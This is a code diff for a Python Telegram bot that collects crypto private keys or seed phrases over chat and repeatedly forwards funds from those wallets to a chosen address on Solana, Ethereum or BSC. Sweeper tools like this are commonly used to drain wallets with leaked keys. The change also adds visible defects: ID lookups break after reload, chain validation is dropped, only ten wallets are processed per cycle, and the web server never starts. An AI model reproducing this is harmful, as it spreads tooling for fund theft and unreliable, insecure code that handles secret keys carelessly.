@@ -10,21 +10,28 @@ from cryptography.fernet import Fernet
 from chains import solana, ethereum, bsc
 from config import TELEGRAM_BOT_TOKEN
 
-# ---------------- CONFIG ----------------
+# ---------------- FLASK ----------------
 
 app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "Bot alive"
+
+# ---------------- LOGGING ----------------
+
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
+
+# ---------------- STORAGE ----------------
 
 DATA_FILE = "wallets.json"
 SECRET_KEY = os.getenv("SECRET_KEY")
 
 if not SECRET_KEY:
-    raise Exception("Set SECRET_KEY env")
+    raise Exception("Missing SECRET_KEY")
 
 cipher = Fernet(SECRET_KEY.encode())
-
-# ---------------- STORAGE ----------------
 
 data_store = {}
 
@@ -38,149 +45,105 @@ def load_data():
     global data_store
     if os.path.exists(DATA_FILE):
         with open(DATA_FILE, "r") as f:
-            data_store = json.load(f)
-            data_store = {int(k): v for k, v in data_store.items()}
-        logger.info("✅ Data loaded")
+            data_store.update(json.load(f))
 
 def save_data():
     with open(DATA_FILE, "w") as f:
         json.dump(data_store, f)
 
-# ---------------- FLASK ----------------
-
-@app.route("/")
-def home():
-    return "Bot alive"
-
 # ---------------- COMMANDS ----------------
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "⚡ High-Performance Sweeper\n\n"
-        "/setwallet <chain> <secret> <destination>\n"
-        "/getinfo\n"
-        "/removewallet"
-    )
+    await update.message.reply_text("🤖 Bot online")
 
 async def setwallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) < 3:
-        await update.message.reply_text("Usage: /setwallet <chain> <secret> <destination>")
+        await update.message.reply_text("Usage error")
         return
 
     chain = context.args[0].lower()
     destination = context.args[-1]
-    secret_input = " ".join(context.args[1:-1])
-
-    if chain not in ["solana", "ethereum", "bsc"]:
-        await update.message.reply_text("Invalid chain")
-        return
-
-    wallet_type = "seed" if " " in secret_input else "private_key"
+    secret = " ".join(context.args[1:-1])
 
     user_id = update.effective_user.id
 
-    wallet = {
+    data_store.setdefault(user_id, []).append({
         "chain": chain,
-        "type": wallet_type,
-        "secret": encrypt(secret_input),
+        "secret": encrypt(secret),
         "destination": destination
-    }
+    })
 
-    data_store.setdefault(user_id, []).append(wallet)
     save_data()
-
-    await update.message.reply_text(f"✅ Added {chain.upper()} ({wallet_type})")
+    await update.message.reply_text("Saved")
 
 async def getinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    wallets = data_store.get(user_id, [])
 
-    if user_id not in data_store:
+    if not wallets:
         await update.message.reply_text("No wallets")
         return
 
-    msg = "📂 Wallets:\n\n"
-    for i, w in enumerate(data_store[user_id]):
-        msg += f"{i+1}. {w['chain']} → {w['destination']}\n"
-
+    msg = "\n".join([f"{w['chain']} → {w['destination']}" for w in wallets])
     await update.message.reply_text(msg)
 
-async def removewallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
+# ---------------- SWEEPER ----------------
 
-    if user_id not in data_store or not data_store[user_id]:
-        await update.message.reply_text("No wallets")
-        return
-
-    data_store[user_id].pop()
-    save_data()
-
-    await update.message.reply_text("🗑 Removed")
-
-# ---------------- HIGH PERFORMANCE SWEEPER ----------------
-
-# max parallel tasks (IMPORTANT)
 MAX_CONCURRENT = 10
 
-async def process_wallet(user_id, wallet, semaphore):
-    async with semaphore:
-        try:
-            secret = decrypt(wallet["secret"])
+async def process_wallet(wallet):
+    try:
+        secret = decrypt(wallet["secret"])
 
-            # run blocking code in thread (VERY IMPORTANT)
-            if wallet["chain"] == "solana":
-                await asyncio.to_thread(solana.forward, secret, wallet["destination"], user_id)
+        if wallet["chain"] == "solana":
+            await asyncio.to_thread(solana.forward, secret, wallet["destination"], 0)
 
-            elif wallet["chain"] == "ethereum":
-                await asyncio.to_thread(ethereum.forward, secret, wallet["destination"], user_id)
+        elif wallet["chain"] == "ethereum":
+            await asyncio.to_thread(ethereum.forward, secret, wallet["destination"], 0)
 
-            elif wallet["chain"] == "bsc":
-                await asyncio.to_thread(bsc.forward, secret, wallet["destination"], user_id)
+        elif wallet["chain"] == "bsc":
+            await asyncio.to_thread(bsc.forward, secret, wallet["destination"], 0)
 
-        except Exception as e:
-            logger.error(f"{user_id} error: {e}")
+    except Exception as e:
+        logger.error(f"sweep error: {e}")
 
 async def sweeper_loop():
-    logger.info("🚀 Async sweeper started")
-
-    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+    logger.info("Sweeper started")
 
     while True:
         tasks = []
 
-        for user_id, wallets in data_store.items():
-            for wallet in wallets:
-                tasks.append(process_wallet(user_id, wallet, semaphore))
+        for wallets in data_store.values():
+            for w in wallets:
+                tasks.append(process_wallet(w))
 
         if tasks:
-            await asyncio.gather(*tasks)
+            await asyncio.gather(*tasks[:MAX_CONCURRENT])
 
-        await asyncio.sleep(1)  # fast but safe
+        await asyncio.sleep(2)
 
-# ---------------- BOT ----------------
+# ---------------- MAIN BOT ----------------
 
-async def main():
+async def run():
     load_data()
 
-    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+    app_bot = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("setwallet", setwallet))
-    application.add_handler(CommandHandler("getinfo", getinfo))
-    application.add_handler(CommandHandler("removewallet", removewallet))
+    app_bot.add_handler(CommandHandler("start", start))
+    app_bot.add_handler(CommandHandler("setwallet", setwallet))
+    app_bot.add_handler(CommandHandler("getinfo", getinfo))
 
-    # start sweeper
+    # start background task safely
     asyncio.create_task(sweeper_loop())
 
-    logger.info("🤖 Bot running")
-    await application.run_polling()
+    logger.info("Bot running")
 
-# ---------------- RUN ----------------
+    await app_bot.run_polling()
+
+# ---------------- ENTRY ----------------
 
 if __name__ == "__main__":
-    import threading
+    asyncio.run(run())
 
-    # run bot async loop in thread
-    threading.Thread(target=lambda: asyncio.run(main()), daemon=True).start()
-
-    # flask stays simple
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
